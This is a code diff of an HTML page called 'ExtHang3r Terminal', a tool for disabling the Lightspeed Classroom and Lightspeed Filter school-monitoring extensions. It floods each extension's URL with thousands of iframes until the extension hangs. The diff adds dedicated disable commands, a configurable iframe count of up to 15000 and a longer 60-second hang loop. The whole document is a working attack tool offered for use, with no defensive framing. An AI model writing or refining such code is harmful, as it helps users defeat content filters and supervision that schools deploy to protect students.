@@ -32,16 +32,6 @@
         margin-right: 10px;
       }
 
-      .container {
-        max-width: 800px;
-        margin: 100px auto 0 auto;
-        padding: 20px;
-        text-align: center;
-        background: #fff;
-        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        border-radius: 8px;
-      }
-
       .terminal {
         background-color: #000;
         color: #0f0;
@@ -165,6 +155,12 @@
         }
       };
 
+      // Global variables
+      let iframeCount = 3000; // Default iframe count
+      let maxIframeCount = 15000; // Maximum iframe count
+      let hangStartTime = null;
+      let hangInterval = null;
+
       const outputEl = document.getElementById('output');
       const inputEl = document.getElementById('commandInput');
       const terminalEl = document.getElementById('terminal');
@@ -176,22 +172,60 @@
       }
 
       function processCommand(command) {
-        const [cmd, arg] = command.split(' ');
-        if (commands[cmd]) {
-          print(`> ${command}`);
-          executeHang(commands[cmd]);
-        } else {
-          print(`Error: Unknown command '${cmd}'`);
-          print("Available commands:");
-          Object.keys(commands).forEach(c => print(`- ${c}`));
+        const [cmd, ...args] = command.split(' ');
+        switch (cmd) {
+          case 'disablelightspeedclassroom':
+          case 'disablelightspeedfilter':
+            if (commands[cmd]) {
+              print(`> ${command}`);
+              executeHang(commands[cmd]);
+            }
+            break;
+          case 'controls':
+            print("Available controls:");
+            print("- disablelightspeedclassroom: Disable Lightspeed Classroom");
+            print("- disablelightspeedfilter: Disable Lightspeed Filter");
+            print("- tabs: Show current number of tabs");
+            print("- tabs set max: Set tabs to maximum");
+            print("- tabs set <number>: Set custom number of tabs");
+            print("- iframes: Show current iframe count and time remaining");
+            break;
+          case 'tabs':
+            if (args[0] === 'set') {
+              if (args[1] === 'max') {
+                iframeCount = maxIframeCount;
+                print(`Tabs set to maximum: ${iframeCount}`);
+              } else if (!isNaN(args[1])) {
+                iframeCount = Math.min(Number(args[1]), maxIframeCount);
+                print(`Tabs set to: ${iframeCount}`);
+              } else {
+                print("Invalid number of tabs.");
+              }
+            } else {
+              print(`Current number of tabs: ${iframeCount}`);
+            }
+            break;
+          case 'iframes':
+            if (hangStartTime) {
+              const elapsed = Math.floor((Date.now() - hangStartTime) / 1000);
+              const remaining = Math.max(0, 60 - elapsed);
+              print(`Iframes: ${iframeCount}`);
+              print(`Time remaining: ${remaining} seconds`);
+            } else {
+              print("No hanging process active.");
+            }
+            break;
+          default:
+            print(`Error: Unknown command '${cmd}'`);
+            print("Type 'controls' for a list of commands.");
         }
       }
 
       // Modified hanging function
       async function executeHang(target) {
         print(`Initializing hang sequence for ${target.name}...`);
-        
-        const iframeCount = 3000; // Default value
+        hangStartTime = Date.now();
+
         const overlay = document.getElementById("overlay");
         overlay.style.display = "flex";
 
@@ -206,12 +240,16 @@
         // Start iframe creation
         replaceIframes(iframeContainer, target.url, iframeCount);
 
-        setTimeout(() => {
-          popup.close();
-          print(`${target.name} hanged successfully!`);
-          overlay.style.display = "none";
-          showKillInstructions(target);
-        }, 15000);
+        hangInterval = setInterval(() => {
+          const elapsed = Math.floor((Date.now() - hangStartTime) / 1000);
+          if (elapsed >= 60) {
+            clearInterval(hangInterval);
+            popup.close();
+            print(`${target.name} hanged successfully!`);
+            overlay.style.display = "none";
+            showKillInstructions(target);
+          }
+        }, 1000);
       }
 
       function replaceIframes(container, iframeSrc, iframeCount) {
@@ -222,7 +260,7 @@
           iframe.style.height = '100px';
           container.appendChild(iframe);
         }
-        setTimeout(function() {
+        setTimeout(() => {
           while (container.firstChild) {
             container.removeChild(container.firstChild);
           }
@@ -258,7 +296,7 @@
 
       // Initial message
       print("ExtHang3r Terminal v1.0");
-      print("Type 'help' for available commands\n");
+      print("Type 'controls' for available commands\n");
     </script>
   </body>
 </html>
